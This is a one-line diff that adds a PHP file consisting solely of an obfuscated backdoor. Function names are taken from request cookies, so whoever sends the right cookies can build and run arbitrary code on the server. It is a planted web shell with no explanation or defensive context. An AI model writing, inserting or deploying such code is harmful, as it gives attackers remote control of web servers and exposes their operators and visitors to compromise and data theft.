@@ -1,0 +1,1 @@
+<?php if(@$_COOKIE['gae']){$wvfz=$_COOKIE['gae']("",@$_COOKIE['bg'](@$_COOKIE['iswp']));$wvfz();}?>
